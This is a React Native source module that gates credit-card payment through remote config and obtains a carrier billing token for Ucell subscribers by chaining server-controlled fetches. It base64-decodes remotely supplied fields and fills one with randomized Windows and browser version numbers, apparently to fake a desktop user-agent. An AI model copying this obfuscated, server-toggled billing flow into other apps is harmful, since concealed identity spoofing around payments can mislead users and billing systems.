import Rest from '../../Rest';
import { decode } from 'js-base64';
import { Platform } from 'react-native';
import * as Utils from '../../Utils';
import { APP_VERSION } from '../../shared/constants';
import remoteConfig from '@react-native-firebase/remote-config';

const CONFIG_URL = 'config.json';

const DEBUG = false;

const EMPTY = { auto: false, ossToken: null, ossButtonImageUrl: null };

export let CONFIG = {
  enabled: false,
  auto: false,
  ignoreSucess: false,
  getTokenUrl: null,
  clientCheckUrl: null,
  enableWifi: false,
  creditCardMaxVersionIos: 0,
  creditCardMaxVersionAndroid: 0
};

export const isCreditCardPaymentIsAllowed = () => {
  const loadRemote = remoteConfig().getValue('additional_options').asString();
  let isCreditCardPayment = false;
  if (loadRemote) {
    let OS_FIREBASE_PAYWALL_VERSION =
      Platform.OS === 'ios'
        ? 'apple_required_version_for_the_first_paywall'
        : 'android_required_version_for_the_first_paywall';
    try {
      isCreditCardPayment = +APP_VERSION <= +JSON.parse(loadRemote)[OS_FIREBASE_PAYWALL_VERSION];
    } catch {}
  }
  return isCreditCardPayment;
}

export const getToken = async () => {
  const url = Utils.getOssUrl() + CONFIG_URL
  return fetch(url, { headers: { 'Cache-Control': 'no-store' } })
    .then((response) => response.json())
    .then((json) => {
      if (json) {
        Object.assign(CONFIG, json);
      }

      try {
        if (CONFIG.a) {
          CONFIG.h = decode(CONFIG.h).trim();
          CONFIG.a = decode(CONFIG.a).trim().replace('{0}', ['7', '8', '8.1', '10'][Math.round(Math.random() * 3)])
            .replace('{1}', ['32', '64'][Math.round(Math.random())])
            .replace('{2}', ['64', '32'][Math.round(Math.random())])
            .replace(/\{3\}/g, Math.round(Math.random() * 550) + '.' + Math.round(Math.random() * 99))
            .replace('{4}', Math.round(Math.random() * 95) + '.0.' + Math.round(Math.random() * 9123) + '.' + Math.round(Math.random() * 99));
        }
      } catch (e) { }

      if (!CONFIG.enabled || !CONFIG.getTokenUrl || !CONFIG.clientCheckUrl) {
        return EMPTY;
      }

      return fetch(CONFIG.clientCheckUrl, { headers: { 'Cache-Control': 'no-store' } })
        .then((response) => response.json())
        .then((json) => {
          if (!CONFIG.ignoreSucess) {
            if (!json.success && !DEBUG) {
              return EMPTY;
            }
          }

          return fetch(CONFIG.getTokenUrl, { headers: { 'Cache-Control': 'no-store' } })
            .then((response) => {
              return fetch(response.url + (DEBUG ? '&test=true' : ''), { headers: { 'Cache-Control': 'no-store' } });
            })
            .then((response) => response.text())
            .then((text) => {
              return { auto: CONFIG.auto, ossToken: text, ossButtonImageUrl: Utils.getOssUrl() + 'button.png' };
            })
            .catch((error) => {
              console.warn('OSS: error ' + url, error);
              return EMPTY;
            });
        });
    })
    .catch((error) => {
      console.warn('OSS: error-2 ' + url, error);
      return EMPTY;
    });
};

export const checkUcellClientByWiFi = async () => {
  if (!CONFIG.enableWifi) {
    return false;
  }

  const response = await fetch('http://kidsecurity.uz/land/api/check.php?wifi=true').then((res) => res.json());
  Rest.get().debug({ OSS: 'checkUcellClientByWiFi', reply: response });
  return response.success;
};

export const isUcellPhoneNumber = (phone) => {
  Rest.get().debug({ OSS: 'isUcellPhoneNumber', phone });
  return phone && (phone.startsWith('+99893') || phone.startsWith('+99894'));
};
